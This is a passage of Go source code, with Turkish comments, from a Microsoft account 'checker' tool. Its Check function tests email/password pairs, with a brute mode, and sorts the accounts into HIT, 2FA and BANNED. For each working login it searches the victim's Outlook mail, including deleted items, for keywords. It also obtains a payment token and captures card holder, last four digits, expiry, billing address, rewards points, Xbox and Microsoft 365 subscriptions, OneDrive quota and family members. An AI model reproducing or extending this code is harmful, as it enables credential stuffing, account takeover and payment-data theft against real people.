			`"(?:country|usageLocation|officeLocation)"\s*:\s*"([^"]{2,50})"`,
		},
		{
			"https://graph.microsoft.com/v1.0/me/profile/addresses",
			`"(?:countryOrRegion|country)"\s*:\s*"([^"]{2,50})"`,
		},
	}
	for _, ep := range endpoints {
		req, _ := http.NewRequest("GET", ep.url, nil)
		req.Header.Set("Authorization", "Bearer "+sess.accessToken)
		req.Header.Set("User-Agent", "Mozilla/5.0")
		req.Header.Set("Accept", "application/json")
		resp, err := sess.client.Do(req)
		if err != nil || resp.StatusCode != 200 {
			if resp != nil {
				resp.Body.Close()
			}
			continue
		}
		b, _ := io.ReadAll(resp.Body)
		resp.Body.Close()
		if m := regexp.MustCompile(ep.pat).FindStringSubmatch(string(b)); len(m) > 1 {
			v := strings.TrimSpace(m[1])
			if v != "" && v != "null" {
				c.dbg("Country from Graph: " + v)
				return v
			}
		}
	}
	return ""
}

// ── STEP: Mail Count (tüm klasörler) ─────────────────────────────────────────
// Gelen kutusu + Arşiv + Silinmiş + Önemsiz + Gönderilmiş + diğer tüm klasörler
func (c *Checker) fetchInboxCount(sess *authSession, email string) string {
	// Yöntem 1: OWA startupdata — tüm folder TotalCount toplamı
	req, _ := http.NewRequest("POST",
		fmt.Sprintf("https://outlook.live.com/owa/%s/startupdata.ashx?app=Mini&n=0", url.QueryEscape(email)),
		strings.NewReader(""))
	req.Header.Set("Host", "outlook.live.com")
	req.Header.Set("x-owa-sessionid", genUUID())
	req.Header.Set("x-req-source", "Mini")
	req.Header.Set("authorization", "Bearer "+sess.accessToken)
	req.Header.Set("user-agent", "Mozilla/5.0 (Linux; Android 9; SM-G975N Build/PQ3B.190801.08041932; wv) AppleWebKit/537.36")
	req.Header.Set("action", "StartupData")
	req.Header.Set("content-type", "application/json; charset=utf-8")

	sess.client.Timeout = 20 * time.Second
	resp, err := sess.client.Do(req)
	sess.client.Timeout = 15 * time.Second
	if err == nil && resp.StatusCode == 200 {
		body, _ := io.ReadAll(resp.Body)
		resp.Body.Close()
		bs := string(body)
		// Tüm TotalCount değerlerini topla (her folder için)
		re := regexp.MustCompile(`"TotalCount"\s*:\s*(\d+)`)
		matches := re.FindAllStringSubmatch(bs, -1)
		if len(matches) > 0 {
			total := 0
			seen := map[string]bool{}
			for _, m := range matches {
				if !seen[m[1]] {
					seen[m[1]] = true
					n, _ := strconv.Atoi(m[1])
					total += n
				}
			}
			if total > 0 {
				c.dbgKV("MailCount OWA", strconv.Itoa(total))
				return strconv.Itoa(total)
			}
		}
	} else if resp != nil {
		resp.Body.Close()
	}

	// Yöntem 2: Graph API — mailFolders listesi ile her folder'ın totalItemCount toplamı
	graphToken := c.exchangeToken(sess, "https://graph.microsoft.com/")
	if graphToken == "" {
		graphToken = sess.accessToken
	}
	// Tüm mail klasörlerini al
	folders := []struct{ name string; count int }{}
	folderURLs := []string{
		"https://graph.microsoft.com/v1.0/me/mailFolders?$top=50&$select=displayName,totalItemCount",
		"https://graph.microsoft.com/v1.0/me/mailFolders/deleteditems/childFolders?$top=50&$select=displayName,totalItemCount",
	}
	for _, fURL := range folderURLs {
		fReq, _ := http.NewRequest("GET", fURL, nil)
		fReq.Header.Set("Authorization", "Bearer "+graphToken)
		fReq.Header.Set("Accept", "application/json")
		fReq.Header.Set("User-Agent", "Mozilla/5.0")
		fResp, ferr := sess.client.Do(fReq)
		if ferr != nil || fResp.StatusCode != 200 {
			if fResp != nil { fResp.Body.Close() }
			continue
		}
		var fData struct {
			Value []struct {
				DisplayName    string `json:"displayName"`
				TotalItemCount int    `json:"totalItemCount"`
			} `json:"value"`
		}
		json.NewDecoder(fResp.Body).Decode(&fData)
		fResp.Body.Close()
		for _, f := range fData.Value {
			folders = append(folders, struct{ name string; count int }{f.DisplayName, f.TotalItemCount})
		}
	}
	if len(folders) > 0 {
		total := 0
		for _, f := range folders {
			total += f.count
		}
		c.dbgKV("MailCount Graph", strconv.Itoa(total))
		if total > 0 {
			return strconv.Itoa(total)
		}
	}

	return "0"
}

// ── STEP: Advanced Inboxer ─────────────────────────────────────────────────────
func (c *Checker) fetchKeywords(sess *authSession) map[string]KeywordResult {
	results := make(map[string]KeywordResult)
	if len(c.Keywords) == 0 {
		return results
	}
	stripHTML := regexp.MustCompile(`<[^>]*>`)

	for _, kw := range c.Keywords {
		queryStr := kw
		if strings.Contains(kw, "@") && !strings.Contains(kw, " ") {
			queryStr = fmt.Sprintf(`from:"%s" OR "%s"`, kw, kw)
		}

		payload := map[string]interface{}{
			"Cvid":            genUUID(),
			"Scenario":        map[string]string{"Name": "owa.react"},
			"TimeZone":        "UTC",
			"TextDecorations": "Off",
			"EntityRequests": []map[string]interface{}{{
				"EntityType":     "Conversation",
				"ContentSources": []string{"Exchange"},
				"Filter": map[string]interface{}{
					"Or": []map[string]interface{}{
						{"Term": map[string]string{"DistinguishedFolderName": "msgfolderroot"}},
						{"Term": map[string]string{"DistinguishedFolderName": "inbox"}},
						{"Term": map[string]string{"DistinguishedFolderName": "DeletedItems"}},
						{"Term": map[string]string{"DistinguishedFolderName": "junkemail"}},
						{"Term": map[string]string{"DistinguishedFolderName": "archive"}},
						{"Term": map[string]string{"DistinguishedFolderName": "sentitems"}},
						{"Term": map[string]string{"DistinguishedFolderName": "recoverableitemsdeletions"}},
					},
				},
				"From":             0,
				"Query":            map[string]string{"QueryString": queryStr},
				"Size":             25,
				"Sort":             []map[string]string{{"Field": "Score", "SortDirection": "Desc"}, {"Field": "Time", "SortDirection": "Desc"}},
				"EnableTopResults": true,
				"Fields":           []string{"Subject", "From", "ConversationTopic", "HitHighlightedSummary", "Preview", "ReceivedTime"},
			}},
			"AnswerEntityRequests":   []interface{}{},
			"QueryAlterationOptions": map[string]interface{}{"EnableSuggestion": true, "EnableAlteration": true},
			"LogicalId":              genUUID(),
		}

		jsonData, _ := json.Marshal(payload)
		req, _ := http.NewRequest("POST", "https://outlook.live.com/search/api/v2/query", bytes.NewBuffer(jsonData))
		req.Header.Set("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36")
		req.Header.Set("Accept", "application/json")
		req.Header.Set("Authorization", "Bearer "+sess.accessToken)
		req.Header.Set("X-AnchorMailbox", "CID:"+sess.cid)
		req.Header.Set("Content-Type", "application/json")

		sess.client.Timeout = 12 * time.Second
		resp, err := sess.client.Do(req)
		sess.client.Timeout = 15 * time.Second
		if err != nil || resp.StatusCode != 200 {
			continue
		}

		var searchData map[string]interface{}
		json.NewDecoder(resp.Body).Decode(&searchData)
		resp.Body.Close()

		var total float64
		var subject, preview, sender string

		if es, ok := searchData["EntitySets"].([]interface{}); ok && len(es) > 0 {
			if esMap, ok := es[0].(map[string]interface{}); ok {
				if rsets, ok := esMap["ResultSets"].([]interface{}); ok && len(rsets) > 0 {
					if rs, ok := rsets[0].(map[string]interface{}); ok {
						if t, ok := rs["Total"].(float64); ok {
							total = t
						}
						if total > 0 {
							if items, ok := rs["Results"].([]interface{}); ok && len(items) > 0 {
								container := items[0].(map[string]interface{})
								for _, inner := range []string{"Document", "Item", "Source"} {
									if sub, ok := container[inner].(map[string]interface{}); ok {
										container = sub
										break
									}
								}
								for _, key := range []string{"ConversationTopic", "Subject", "NormalizedSubject", "subject"} {
									if v, ok := container[key].(string); ok && v != "" {
										subject = v
										break
									}
								}
								for _, key := range []string{"HitHighlightedSummary", "BodyPreview", "Preview", "preview"} {
									if v, ok := container[key].(string); ok && v != "" {
										clean := strings.TrimSpace(stripHTML.ReplaceAllString(v, ""))
										if len(clean) > 120 {
											clean = clean[:120] + "…"
										}
										preview = clean
										break
									}
								}
								for _, key := range []string{"From", "Sender", "from"} {
									if v, ok := container[key].(string); ok && v != "" {
										sender = v
										break
									}
									if nested, ok := container[key].(map[string]interface{}); ok {
										if ea, ok := nested["EmailAddress"].(map[string]interface{}); ok {
											if addr, ok := ea["Address"].(string); ok && addr != "" {
												sender = addr
											}
										}
									}
								}
							}
						}
					}
				}
			}
		}
		if total > 0 {
			results[kw] = KeywordResult{Count: total, Subject: subject, Preview: preview, Sender: sender}
		}
	}
	return results
}

// ── STEP: Payment Token ────────────────────────────────────────────────────────
// SVB config approach: GET the authorize URL with allow_redirects=True,
// then parse access_token from the final redirect URL (<ADDRESS>).
// Go strips URL fragments (#...) during redirect, so we intercept in CheckRedirect.
// Token is between "access_token=" and "&token_type" (SVB: LR "access_token=" "&token_type")

func (c *Checker) getPaymentToken(sess *authSession) string {
	c.dbgStep(6, "PAYMENT TOKEN (PIFD)")

	userID := strings.ReplaceAll(genUUID(), "-", "")[:16]
	stateJSON := fmt.Sprintf(`{"userId":"%s","scopeSet":"pidl"}`, userID)
	authURL := "https://login.live.com/oauth20_authorize.srf?client_id=000000000004773A" +
		"&response_type=token" +
		"&scope=PIFD.Read+PIFD.Create+PIFD.Update+PIFD.Delete" +
		"&redirect_uri=https%3A%2F%2Faccount.microsoft.com%2Fauth%2Fcomplete-silent-delegate-auth" +
		"&state=" + url.QueryEscape(stateJSON) + "&prompt=none"

	c.dbgKV("PayToken URL", authURL[:intMin(80,len(authURL))]+"…")

	// Capture token from redirect chain (URL fragment)
	var captured string
	redirCount := 0

	tokenClient := &http.Client{
		Timeout: 25 * time.Second,
		Jar:     sess.jar,
		CheckRedirect: func(req *http.Request, via []*http.Request) error {
			redirCount++
			rawURL := req.URL.String()
			c.dbgKV(fmt.Sprintf("  Redir[%d]", redirCount), rawURL[:intMin(90,len(rawURL))])

			// SVB style: parse between "access_token=" and "&token_type"
			// Also try fragment (#access_token=...) and query param
			for _, pat := range []string{
				`access_token=([^&# '"\n]+)&token_type`,
				`[#&?]access_token=([^&# '"\n]+)`,
				`access_token=([^&# '"\n]+)`,
			} {
				if m := regexp.MustCompile(pat).FindStringSubmatch(rawURL); len(m) > 1 {
					tok, _ := url.QueryUnescape(m[1])
					if len(tok) > 50 {
						captured = tok
						c.dbgOK(fmt.Sprintf("PayToken captured in redir[%d] (%d chars)", redirCount, len(tok)))
						return http.ErrUseLastResponse
					}
				}
			}
			if len(via) >= 12 {
				c.dbgFail("PayToken: max redirects reached")
				return http.ErrUseLastResponse
			}
			return nil
		},
	}

	req, _ := http.NewRequest("GET", authURL, nil)
	req.Header.Set("Host", "login.live.com")
	req.Header.Set("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:87.0) Gecko/20100101 Firefox/87.0")
	req.Header.Set("Accept", "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8")
	req.Header.Set("Accept-Language", "en-US,en;q=0.5")
	// No Accept-Encoding: let Go handle decompression automatically
	req.Header.Set("Connection", "close")
	req.Header.Set("Referer", "https://account.microsoft.com/")

	resp, err := tokenClient.Do(req)
	if captured != "" {
		if resp != nil { resp.Body.Close() }
		return captured
	}
	if err != nil {
		c.dbgFail("PayToken request error: " + err.Error())
		return ""
	}
	defer resp.Body.Close()

	// Fallback: scan final response body for token
	body, _ := io.ReadAll(resp.Body)
	finalURL := ""
	if resp.Request != nil {
		finalURL = resp.Request.URL.String()
	}
	c.dbgKV("PayToken finalURL", finalURL[:intMin(90,len(finalURL))])
	searchText := string(body) + " " + finalURL

	for _, pat := range []string{
		`access_token=([^&# '"\n]+)&token_type`,
		`access_token=([^&# '"\n]+)`,
		`"access_token"\s*:\s*"([^"]+)"`,
	} {
		if m := regexp.MustCompile(pat).FindStringSubmatch(searchText); len(m) > 1 {
			tok, _ := url.QueryUnescape(m[1])
			if len(tok) > 50 {
				c.dbgOK(fmt.Sprintf("PayToken from body fallback (%d chars)", len(tok)))
				return tok
			}
		}
	}

	// Show snippet of body for debug
	if c.Debug {
		snip := string(body)
		if len(snip) > 200 { snip = snip[:200] }
		c.dbgKV("PayToken body snip", snip)
	}
	c.dbgFail("PayToken: not found after all attempts")
	return ""
}

// ── STEP: Billing Capture ──────────────────────────────────────────────────────
func (c *Checker) fetchBilling(sess *authSession, payToken string) *BillingData {
	if payToken == "" {
		return nil
	}
	bd := &BillingData{}
	hdrs := map[string]string{
		"User-Agent":      "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
		"Pragma":          "no-cache",
		"Accept":          "application/json",
		"Accept-Language": "en-US,en;q=0.9",
		"Authorization":   `MSADELEGATE1.0="` + payToken + `"`,
		"Connection":      "keep-alive",
		"Content-Type":    "application/json",
		"Host":            "paymentinstruments.mp.microsoft.com",
		"ms-cV":           "FbMB+cD6byLL1mn4W/NuGH.2",
		"Origin":          "https://account.microsoft.com",
		"Referer":         "https://account.microsoft.com/",
		"Sec-Fetch-Dest":  "empty",
		"Sec-Fetch-Mode":  "cors",
		"Sec-Fetch-Site":  "same-site",
		"Sec-GPC":         "1",
	}
	req, _ := http.NewRequest("GET",
		"https://paymentinstruments.mp.microsoft.com/v6.0/users/me/paymentInstrumentsEx?status=active,removed&language=en-US",
		nil)
	for k, v := range hdrs {
		req.Header.Set(k, v)
	}
	resp, err := sess.client.Do(req)
	if err != nil || resp.StatusCode != 200 {
		return nil
	}
	defer resp.Body.Close()
	body, _ := io.ReadAll(resp.Body)
	bs := string(body)
	if !strings.Contains(bs, "lastFourDigits") {
		return nil
	}
	p := func(pat string) string {
		if m := regexp.MustCompile(pat).FindStringSubmatch(bs); len(m) > 1 {
			return m[1]
		}
		return ""
	}
	bd.CardHolder = p(`"accountHolderName"\s*:\s*"([^"]+)"`)
	bd.Last4 = p(`"lastFourDigits"\s*:\s*"([^"]+)"`)
	if m := regexp.MustCompile(`"paymentMethodFamily"\s*:\s*"credit_card".*?"name"\s*:\s*"([^"]+)"`).FindStringSubmatch(bs); len(m) > 1 {
		bd.CardType = m[1]
	}
	bd.ExpiryMonth = p(`"expiryMonth"\s*:\s*"([^"]+)"`)
	bd.ExpiryYear = p(`"expiryYear"\s*:\s*"([^"]+)"`)
	if bal := p(`"balance"\s*:\s*([0-9.]+)`); bal != "" {
		bd.Balance = "$" + bal
	}
	bd.City = p(`"city"\s*:\s*"([^"]+)"`)
	bd.Zipcode = p(`"postal_code"\s*:\s*"([^"]+)"`)
	// Extract country (2-letter code) from billing response
	bd.Country = p(`"country"\s*:\s*"([A-Z]{2})"`)
	func() {
		r, err := sess.client.Get("https://rewards.bing.com/")
		if err != nil {
			return
		}
		defer r.Body.Close()
		rb, _ := io.ReadAll(r.Body)
		if m := regexp.MustCompile(`"availablePoints"\s*:\s*(\d+)`).FindStringSubmatch(string(rb)); len(m) > 1 {
			bd.RewardsPoints = m[1]
		}
	}()
	return bd
}

// ── STEP: Xbox Subscription Capture ───────────────────────────────────────────
func (c *Checker) fetchXbox(sess *authSession, payToken, displayName string) *XboxData {
	c.dbgStep(7, "XBOX CAPTURE")
	if payToken == "" {
		return nil
	}
	xd := &XboxData{Gamertag: displayName}
	hdrs := map[string]string{
		"User-Agent":      "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
		"Pragma":          "no-cache",
		"Accept":          "application/json",
		"Accept-Language": "en-US,en;q=0.9",
		"Authorization":   `MSADELEGATE1.0="` + payToken + `"`,
		"Connection":      "keep-alive",
		"Content-Type":    "application/json",
		"Host":            "paymentinstruments.mp.microsoft.com",
		"ms-cV":           "FbMB+cD6byLL1mn4W/NuGH.2",
		"Origin":          "https://account.microsoft.com",
		"Referer":         "https://account.microsoft.com/",
		"Sec-Fetch-Dest":  "empty",
		"Sec-Fetch-Mode":  "cors",
		"Sec-Fetch-Site":  "same-site",
		"Sec-GPC":         "1",
	}

	setHdrs := func(req *http.Request) {
		for k, v := range hdrs {
			req.Header.Set(k, v)
		}
	}

	p := func(bs, pat string) string {
		if m := regexp.MustCompile(pat).FindStringSubmatch(bs); len(m) > 1 {
			return m[1]
		}
		return ""
	}

	// ── API 1: paymentInstruments (card + balance + rewards + country) ──────
	req1, _ := http.NewRequest("GET",
		"https://paymentinstruments.mp.microsoft.com/v6.0/users/me/paymentInstrumentsEx?status=active,removed&language=en-US", nil)
	setHdrs(req1)
	if resp1, err := sess.client.Do(req1); err == nil {
		b1, _ := io.ReadAll(resp1.Body)
		resp1.Body.Close()
		bs1 := string(b1)
		c.dbgKV("  PI HTTP", fmt.Sprintf("%d len=%d", resp1.StatusCode, len(bs1)))
		c.dbgKV("  PI body", bs1[:intMin(300, len(bs1))])

		if resp1.StatusCode == 200 {
			if bal := p(bs1, `"balance"\s*:\s*([0-9.]+)`); bal != "" {
				xd.Balance = "$" + bal
			}
			if ch := p(bs1, `"accountHolderName"\s*:\s*"([^"]+)"`); ch != "" {
				xd.CardHolder = ch
			}
			if co := p(bs1, `"country"\s*:\s*"([A-Z]{2})"`); co != "" {
				xd.Country = co
			}
			c.dbgOK(fmt.Sprintf("PaymentInstruments OK | Balance=%s CardHolder=%s Country=%s", xd.Balance, xd.CardHolder, xd.Country))
		}
	}

	// ── API 2: Bing Rewards ───────────────────────────────────────────────
	c.dbg("  Xbox API2: Bing Rewards")
	if rr, err := sess.client.Get("https://rewards.bing.com/"); err == nil {
		rb, _ := io.ReadAll(rr.Body)
		rr.Body.Close()
		if pts := p(string(rb), `"availablePoints"\s*:\s*(\d+)`); pts != "" {
			xd.RewardsPoints = pts
			c.dbgKV("  Rewards pts", pts)
		}
	}

	c.dbg("  Xbox API3: paymentTransactions")
	req2, _ := http.NewRequest("GET",
		"https://paymentinstruments.mp.microsoft.com/v6.0/users/me/paymentTransactions", nil)
	setHdrs(req2)
	resp2, err := sess.client.Do(req2)
	if err != nil {
		c.dbgFail("paymentTransactions error: " + err.Error())
		xd.IsFree = true
		xd.PremiumType = "FREE"
		return xd
	}
	body2, _ := io.ReadAll(resp2.Body)
	resp2.Body.Close()
	bs := string(body2)
	c.dbgKV("  TX HTTP", fmt.Sprintf("%d len=%d", resp2.StatusCode, len(bs)))
	c.dbgKV("  TX body", bs[:intMin(400, len(bs))])
	if resp2.StatusCode != 200 {
		xd.IsFree = true
		xd.PremiumType = "FREE"
		return xd
	}

	subs := []struct{ key, label string }{
		{"Xbox Game Pass Ultimate", "GAME PASS ULTIMATE"},
		{"PC Game Pass", "PC GAME PASS"},
		{"Game Pass Console", "GAME PASS CONSOLE"},
		{"Game Pass Core", "GAME PASS CORE"},
		{"Xbox Live Gold", "XBOX LIVE GOLD"},
		{"EA Play Pro", "EA PLAY PRO"},
		{"EA Play", "EA PLAY"},
		{"Xbox Cloud Gaming", "XBOX CLOUD GAMING"},
		{"Microsoft 365 Personal", "M365 PERSONAL"},
		{"Microsoft 365 Family", "M365 FAMILY"},
		{"Microsoft 365 Basic", "M365 BASIC"},
		{"OneDrive", "ONEDRIVE"},
		{"Copilot Pro", "COPILOT PRO"},
		{"Skype", "SKYPE"},
		{"Game Pass", "GAME PASS"},
	}
	found := false
	for _, s := range subs {
		if strings.Contains(bs, s.key) {
			xd.PremiumType = s.label
			xd.Subscription = s.key
			found = true
			break
		}
	}
	if !found {
		c.dbgFail("No subscription found — FREE account")
		xd.IsFree = true
		xd.PremiumType = "FREE"
		return xd
	}
	c.dbgOK("Subscription found: " + xd.PremiumType)
	xd.EAPlay = strings.Contains(bs, "EA Play")
	if t := p(bs, `"title"\s*:\s*"([^"]+)"`); t != "" {
		xd.Subscription = t
	}
	xd.StartDate = p(bs, `"startDate"\s*:\s*"([^T"]+)`)
	xd.RenewalDate = p(bs, `"nextRenewalDate"\s*:\s*"([^T"]+)`)
	if xd.RenewalDate != "" {
		xd.DaysLeft = getRemainingDays(xd.RenewalDate + "T00:00:00Z")
		// SVB: KEYCHAIN Custom "EXPIRED" OR KEY "<day>" Contains "-"
		if strings.HasPrefix(xd.DaysLeft, "-") {
			xd.IsExpired = true
		}
	}
	if auto := p(bs, `"autoRenew"\s*:\s*(true|false)`); auto == "true" {
		xd.AutoRenew = "YES"
	} else if auto == "false" {
		xd.AutoRenew = "NO"
	}
	xd.TotalAmount = p(bs, `"totalAmount"\s*:\s*([0-9.]+)`)
	xd.Currency = p(bs, `"currency"\s*:\s*"([^"]+)"`)
	// Extract country from transactions if not already found
	if xd.Country == "" {
		if co := p(bs, `"country"\s*:\s*"([A-Z]{2})"`); co != "" {
			xd.Country = co
		}
	}
	return xd
}

func getRemainingDays(dateStr string) string {
	for _, f := range []string{time.RFC3339, "2006-01-02T15:04:05Z", "2006-01-02T15:04:05"} {
		if t, err := time.Parse(f, dateStr); err == nil {
			return strconv.Itoa(int(math.Round(time.Until(t).Hours() / 24)))
		}
	}
	return "?"
}

// ── STEP: OneDrive Storage ────────────────────────────────────────────────────
// getLiveToken: Personal Microsoft account için live.com üzerinden token alır
func (c *Checker) getLiveToken(sess *authSession, scope string) string {
	if sess.refreshToken == "" {
		return ""
	}
	body := url.Values{
		"grant_type":    {"refresh_token"},
		"client_id":     {"0000000048170EF2"},
		"redirect_uri":  {"https://login.live.com/oauth20_desktop.srf"},
		"refresh_token": {sess.refreshToken},
		"scope":         {scope},
	}
	req, _ := http.NewRequest("POST", "https://login.live.com/oauth20_token.srf", strings.NewReader(body.Encode()))
	req.Header.Set("Content-Type", "application/x-www-form-urlencoded")
	req.Header.Set("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64)")
	resp, err := sess.client.Do(req)
	if err != nil {
		return ""
	}
	b, _ := io.ReadAll(resp.Body)
	resp.Body.Close()
	c.dbgKV(fmt.Sprintf("liveToken[%s]", scope[:min(25, len(scope))]), fmt.Sprintf("HTTP %d", resp.StatusCode))
	if resp.StatusCode == 200 {
		var j map[string]interface{}
		json.Unmarshal(b, &j)
		if tok, ok := j["access_token"].(string); ok && len(tok) > 30 {
			return tok
		}
	}
	return ""
}

// exchangeToken: Personal account icin live.com token exchange
func (c *Checker) exchangeToken(sess *authSession, resource string) string {
	if sess.refreshToken == "" {
		return ""
	}
	// login.microsoftonline.com personal account icin CALISMAZ (her zaman 400)
	// Sadece login.live.com kullanilmali
	scopeMap := map[string]string{
		"https://graph.microsoft.com/":          "https://graph.microsoft.com/User.Read Files.Read.All offline_access",
		"https://api.onedrive.com/":             "wl.offline_access wl.skydrive wl.skydrive_update",
	}
	scope, hasScope := scopeMap[resource]
	if !hasScope {
		scope = resource + " offline_access"
	}
	tok := c.getLiveToken(sess, scope)
	if tok != "" {
		return tok
	}
	// Fallback: resource= parametresi ile dene
	body2 := url.Values{
		"grant_type":    {"refresh_token"},
		"client_id":     {"0000000048170EF2"},
		"redirect_uri":  {"https://login.live.com/oauth20_desktop.srf"},
		"refresh_token": {sess.refreshToken},
		"resource":      {resource},
	}
	req, _ := http.NewRequest("POST", "https://login.live.com/oauth20_token.srf", strings.NewReader(body2.Encode()))
	req.Header.Set("Content-Type", "application/x-www-form-urlencoded")
	req.Header.Set("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64)")
	resp, err := sess.client.Do(req)
	if err != nil {
		return ""
	}
	b, _ := io.ReadAll(resp.Body)
	resp.Body.Close()
	c.dbgKV(fmt.Sprintf("tokenEx[%s]", resource[:min(20, len(resource))]), fmt.Sprintf("HTTP %d", resp.StatusCode))
	if resp.StatusCode == 200 {
		var j map[string]interface{}
		json.Unmarshal(b, &j)
		if tok2, ok := j["access_token"].(string); ok && len(tok2) > 30 {
			return tok2
		}
	}
	return ""
}

func min(a, b int) int {
	if a < b { return a }
	return b
}

// ── STEP: OneDrive Storage ────────────────────────────────────────────────────
// live.com OneDrive scope token -> api.onedrive.com veya Graph API
func (c *Checker) fetchOneDrive(sess *authSession) *OneDriveData {
	c.dbgStep(9, "ONEDRIVE")

	parseQuota := func(body []byte) *OneDriveData {
		var data map[string]interface{}
		json.Unmarshal(body, &data)
		quota, ok := data["quota"].(map[string]interface{})
		if !ok {
			return nil
		}
		toBytes := func(key string) float64 {
			if v, ok := quota[key].(float64); ok { return v }
			return 0
		}
		toGB := func(b float64) float64 { return b / (1024 * 1024 * 1024) }
		usedB  := toBytes("used")
		totalB := toBytes("total")
		if totalB == 0 {
			rem := toBytes("remaining")
			if rem > 0 && usedB > 0 {
				totalB = usedB + rem
			} else {
				return nil
			}
		}
		remaining := totalB - usedB
		pct := usedB / totalB * 100
		return &OneDriveData{
			Used:      fmt.Sprintf("%.2f GB", toGB(usedB)),
			Total:     fmt.Sprintf("%.2f GB", toGB(totalB)),
			Remaining: fmt.Sprintf("%.2f GB", toGB(remaining)),
			Pct:       fmt.Sprintf("%.1f%%", pct),
		}
	}

	doGet := func(tok, endpoint string) *OneDriveData {
		req, _ := http.NewRequest("GET", endpoint, nil)
		req.Header.Set("Authorization", "Bearer "+tok)
		req.Header.Set("Accept", "application/json")
		req.Header.Set("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36")
		resp, err := sess.client.Do(req)
		if err != nil {
			return nil
		}
		body, _ := io.ReadAll(resp.Body)
		resp.Body.Close()
		n := len(endpoint)
		snip := endpoint[max(0, n-15):]
		c.dbgKV(fmt.Sprintf("OneDrive[%s]", snip), fmt.Sprintf("HTTP %d len=%d", resp.StatusCode, len(body)))
		if resp.StatusCode != 200 {
			return nil
		}
		return parseQuota(body)
	}

	// Yöntem 1: live.com ile OneDrive scope token al (personal account icin en dogru yol)
	odScopes := []string{
		"wl.offline_access wl.skydrive wl.skydrive_update",
		"wl.offline_access OneDrive.ReadWrite",
	}
	for _, scope := range odScopes {
		tok := c.getLiveToken(sess, scope)
		if tok == "" {
			continue
		}
		c.dbgKV("OneDrive liveToken len", fmt.Sprintf("%d", len(tok)))
		for _, ep := range []string{
			"https://api.onedrive.com/v1.0/drive/quota",
			"https://api.onedrive.com/v1.0/drive",
			"https://graph.microsoft.com/v1.0/me/drive?$select=quota,driveType",
		} {
			if od := doGet(tok, ep); od != nil {
				c.dbgOK(fmt.Sprintf("OneDrive: %s / %s (%s)", od.Used, od.Total, od.Pct))
				return od
			}
		}
	}

	// Yöntem 2: Mevcut access token ile fallback
	if sess.accessToken != "" {
		for _, ep := range []string{
			"https://graph.microsoft.com/v1.0/me/drive?$select=quota,driveType",
			"https://graph.microsoft.com/v1.0/me/drive",
		} {
			if od := doGet(sess.accessToken, ep); od != nil {
				c.dbgOK(fmt.Sprintf("OneDrive (fallback): %s / %s (%s)", od.Used, od.Total, od.Pct))
				return od
			}
		}
	}

	c.dbgFail("OneDrive: tüm yöntemler basarisiz")
	return nil
}

func max(a, b int) int {
	if a > b { return a }
	return b
}

// ── STEP: Microsoft Family ────────────────────────────────────────────────────
func (c *Checker) fetchFamily(sess *authSession) *FamilyData {
	c.dbgStep(11, "FAMILY")
	if sess.accessToken == "" {
		return nil
	}
	req, _ := http.NewRequest("GET",
		"https://graph.microsoft.com/v1.0/me/people?$select=displayName,personType&$top=50",
		nil)
	// Try family safety endpoint first
	famReq, _ := http.NewRequest("GET",
		"https://substrate.office.com/profile/v2.0/family/members",
		nil)
	famReq.Header.Set("Authorization", "Bearer "+sess.accessToken)
	famReq.Header.Set("User-Agent", "Outlook-Android/2.0")
	famReq.Header.Set("X-AnchorMailbox", "CID:"+sess.cid)
	_ = req

	famResp, err := sess.client.Do(famReq)
	if err != nil {
		return nil
	}
	defer famResp.Body.Close()
	famBody, _ := io.ReadAll(famResp.Body)
	famBS := string(famBody)
	c.dbgKV("Family HTTP", fmt.Sprintf("%d len=%d", famResp.StatusCode, len(famBS)))

	if famResp.StatusCode != 200 || !strings.Contains(famBS, "displayName") {
		// Fallback: Microsoft account family API
		famReq2, _ := http.NewRequest("GET",
			"https://account.microsoft.com/family/v2/members",
			nil)
		famReq2.Header.Set("Authorization", "Bearer "+sess.accessToken)
		famReq2.Header.Set("User-Agent", "Mozilla/5.0")
		r2, err2 := sess.client.Do(famReq2)
		if err2 != nil || r2.StatusCode != 200 {
			if r2 != nil { r2.Body.Close() }
			return nil
		}
		defer r2.Body.Close()
		b2, _ := io.ReadAll(r2.Body)
		famBS = string(b2)
		c.dbgKV("Family2 HTTP", fmt.Sprintf("%d len=%d", r2.StatusCode, len(famBS)))
		if !strings.Contains(famBS, "displayName") {
			return nil
		}
	}

	// Parse member names
	nameRe := regexp.MustCompile(`"displayName"\s*:\s*"([^"]+)"`)
	var members []string
	seen := map[string]bool{}
	for _, m := range nameRe.FindAllStringSubmatch(famBS, -1) {
		n := m[1]
		if !seen[n] && n != "" {
			members = append(members, n)
			seen[n] = true
		}
	}

	isOrg := strings.Contains(famBS, `"isOrganizer":true`) ||
		strings.Contains(famBS, `"role":"organizer"`)

	fd := &FamilyData{
		IsFamilyOrganizer: isOrg,
		MemberCount:       len(members),
		Members:           members,
	}
	c.dbgOK(fmt.Sprintf("Family: %d members, organizer=%v", fd.MemberCount, fd.IsFamilyOrganizer))
	return fd
}

// ── Main Check ─────────────────────────────────────────────────────────────────
func (c *Checker) Check(email, password string) CheckResult {
	res := CheckResult{
		Email: email, Password: password, Status: "BAD",
		Keywords: make(map[string]KeywordResult),
	}
	sess, err := c.doAuth(email, password)
	if err != nil {
		switch err.Error() {
		case "2FA":
			res.Status = "2FA"
		case "BANNED":
			res.Status = "BANNED"
		default:
			res.Status = "BAD"
		}
		return res
	}
	if c.Mode == ModeBrute {
		res.Status = "HIT"
		return res
	}
	res.Name, res.Country = c.fetchProfile(sess, email)
	// Fallback: try Microsoft Graph for country if profile didn't give it
	if res.Country == "" {
		res.Country = c.fetchCountryFromGraph(sess)
	}
	if c.Mode == ModeInboxerOnly {
		res.Inbox = c.fetchInboxCount(sess, email)
		res.Keywords = c.fetchKeywords(sess)
	}
	if c.Mode == ModeXboxOnly {
		payToken := c.getPaymentToken(sess)
		c.dbgKV("PayToken len", fmt.Sprintf("%d", len(payToken)))
		if payToken != "" {
			res.Billing = c.fetchBilling(sess, payToken)
			res.Xbox = c.fetchXbox(sess, payToken, res.Name)
		} else {
			// Token failed — still mark as Xbox hit with FREE status
